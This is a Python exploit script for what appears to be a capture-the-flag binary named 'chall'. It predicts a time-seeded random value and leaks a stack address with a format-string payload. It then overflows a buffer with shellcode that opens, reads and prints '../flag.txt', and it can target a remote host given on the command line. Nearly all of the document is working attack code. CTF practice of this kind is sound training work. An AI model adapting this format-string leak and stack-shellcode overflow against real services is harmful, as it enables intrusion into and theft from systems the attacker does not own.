#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
import ctypes
from time import sleep

context.update(
    log_level='debug',
    binary=ELF('./chall', checksec=False),
    terminal=[
        "wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".",
        "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"
    ]
)
exe = context.binary
libc = ctypes.CDLL(None)

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x13B8
brva 0x13DB
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    else:
        return process([exe.path] + argv, aslr=False)

def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()

def rand():
    return libc.rand()

# ==================== EXPLOIT ====================
while True:
    p = start()

    libc.srand(int(time.time()))
    sleep(1)
    nhonks = rand() % 91 + 10

    sla(b'> ', b'Kaiz0r')

    sla(b'honks', str(nhonks).encode())

    try:
        payload = b'%52$p'
        sla(b'again?', payload)

        ru(b'wow ')
        stack_leak = int(ru(b' you', drop=True), 16)
        success(f'Stack leak: {hex(stack_leak)}')

        shellcode = shellcraft.open('../flag.txt\0', 0)
        shellcode += shellcraft.read('rax', 'rsp', 0x100)
        shellcode += shellcraft.write(1, 'rsp', 0x100)

        payload = asm(shellcode)
        payload = payload.ljust(0x178, b'\0') + p64(stack_leak - 0x190)

        sleep(1)
        s(payload)
        break
    
    except EOFError:
        close()

interactive(flag=False)
